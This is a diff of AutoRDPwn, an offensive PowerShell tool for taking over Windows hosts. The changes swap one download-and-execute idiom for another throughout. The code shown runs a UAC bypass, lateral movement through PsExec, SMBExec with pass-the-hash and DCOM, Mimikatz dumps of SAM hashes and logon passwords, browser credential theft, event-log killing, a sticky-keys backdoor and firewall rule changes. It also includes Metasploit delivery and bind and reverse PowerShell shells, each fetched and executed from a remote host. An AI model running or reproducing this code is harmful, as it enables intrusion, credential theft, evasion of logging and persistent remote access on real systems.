@@ -1,5 +1,5 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/AutoBypass.ps1" -UseBasicParsing | iex
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/AutoBypass.ps1')
 $noadmin=$args[0] ; if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" ; exit }}
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/AutoRDPwn.ico" -OutFile AutoRDPwn.ico -UseBasicParsing ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Set-ConsoleIcon.ps1" -OutFile Set-ConsoleIcon.ps1 -UseBasicParsing ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
 $Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
@@ -251,7 +251,7 @@ if($Language -in 'Spanish') {
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
 	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } 
 	$Host.UI.RawUI.ForegroundColor = 'Blue'
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1" -UseBasicParsing | iex
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1')
 	if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe "$Pwn1" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe "$Pwn2" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe "$Pwn3" -nobanner -accepteula
@@ -275,7 +275,7 @@ if($Language -in 'Spanish') {
         do { Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray ; $hash = $Host.UI.ReadLine()
         if(!$hash) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $hash )
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1" -UseBasicParsing | iex
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1')
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn2" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn3" ; Write-Host
@@ -348,7 +348,7 @@ if($Language -in 'Spanish') {
 
 	'6' {
         Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "$txt28" -ForegroundColor Blue ; Write-Host
-	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Get-System.ps1" -UseBasicParsing | iex
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Get-System.ps1')
         Get-System -Technique Token ; Write-Host ; Write-Host "$using:txt33" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session ; Write-Host
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $tscon = $Host.UI.ReadLine()
 	tscon $tscon 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
@@ -359,7 +359,7 @@ if($Language -in 'Spanish') {
         $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
 	$computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
-	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-DCOM.ps1" -UseBasicParsing | iex
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-DCOM.ps1')
 	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn1" ; Write-Host
 	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn2" ; Write-Host
 	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn3" ; Write-Host
@@ -415,18 +415,18 @@ if($Language -in 'Spanish') {
 
         if($mimikatz -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
         Write-Host ; Write-Host "$txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1" -UseBasicParsing | iex
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1')
         Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit" | Set-Clipboard ; Get-Clipboard
         $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($mimikatz -like '2') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
         Write-Host ; Write-Host "$txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1" -UseBasicParsing | iex
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1')
         Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit" | Set-Clipboard ; Get-Clipboard
         $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($mimikatz -like '3') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500	; $Host.UI.RawUI.ForegroundColor = 'Gray'
-	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SharpWeb.ps1" -UseBasicParsing | iex
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SharpWeb.ps1')
         .\SharpWeb.exe all | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; del .\SharpWeb.exe ; sleep -milliseconds 2500 }
 
         if($mimikatz -like '4') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500	; $Host.UI.RawUI.ForegroundColor = 'Gray'
@@ -450,7 +450,7 @@ if($Language -in 'Spanish') {
 
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $networking = $Host.UI.ReadLine() ; Write-Host
         if($networking -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Portscan.ps1" -UseBasicParsing | iex
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Portscan.ps1')
         Write-host "$txt55" -NoNewLine -ForegroundColor Gray ; $porthost = $Host.UI.ReadLine() ; Write-Host
         Write-host "$txt56" -NoNewLine -ForegroundColor Gray ; $threads = $Host.UI.ReadLine() ; Write-Host
         Write-host "$txt57" -NoNewLine -ForegroundColor Gray ; $topports = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Blue'
@@ -500,15 +500,15 @@ if($Language -in 'Spanish') {
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $forensics = $Host.UI.ReadLine() ; Write-Host
 
         if($forensics -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt19" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/RDP-Caching.ps1 -UseBasicParsing | iex ; explorer $env:temp\Recovered_RDP_Session
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/RDP-Caching.ps1') ; explorer $env:temp\Recovered_RDP_Session
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; sleep -milliseconds 2500 }
 
         if($forensics -like '2') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex | Set-Clipboard ; Get-Clipboard
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing') | Set-Clipboard ; Get-Clipboard
         ListAllUsers | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; sleep -milliseconds 2500 }
 	
 	if($forensics -like '3') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/SessionGopher.ps1 -UseBasicParsing | iex
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/SessionGopher.ps1')
         Invoke-SessionGopher -Thorough | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($forensics -like 'X'){ $input = 'x' ; continue }
@@ -526,7 +526,7 @@ if($Language -in 'Spanish') {
         if($backdoor -in '1','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
 
         if($module -like '6') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Phant0m.ps1" -UseBasicParsing | iex
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Phant0m.ps1')
         Invoke-Phant0m ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($module -like '7') { $vncserver ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
@@ -581,7 +581,7 @@ if($Language -in 'Spanish') {
     $version = invoke-command -session $RDP[0] -scriptblock { (Get-WmiObject -class Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 
     if($vncserver){ invoke-command -session $RDP[0] -scriptblock {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCServer.ps1" -UseBasicParsing | iex }}
+    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCServer.ps1') }}
 	
     if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock {
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
@@ -612,7 +612,7 @@ if($Language -in 'Spanish') {
         [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }
 
     invoke-command -session $RDP[0] -scriptblock {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-RDPwrap.ps1" -UseBasicParsing | iex
+    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-RDPwrap.ps1')
     msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn6" 2>&1> $null
     netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
     netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
@@ -637,10 +637,10 @@ netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=al
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex }}
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1') }}
 
 if ($metasploit){ invoke-command -session $RDP[0] -scriptblock { Write-Host
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1" -UseBasicParsing | iex 
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1')
 Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
 Invoke-MetasploitPayload -url http://$metaserver/$metarandom -verbose
 Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host ; sleep -milliseconds 7500 }}
@@ -650,13 +650,13 @@ netsh advfirewall firewall add rule name="Powershell Remote Control Application"
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "$using:txt51 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc $using:computer $using:ncport" -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1" -UseBasicParsing | iex ; Invoke-PowerShellTcp -Bind -Port $using:ncport }}
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1') ; Invoke-PowerShellTcp -Bind -Port $using:ncport }}
 
 if ($netcat -in 'remote'){ invoke-command -session $RDP[0] -scriptblock { Write-Host
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "$using:txt52 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc -l $using:ncport" -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host ; sleep -milliseconds 7500
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1" -UseBasicParsing | iex ; Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport }}
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1') ; Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport }}
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
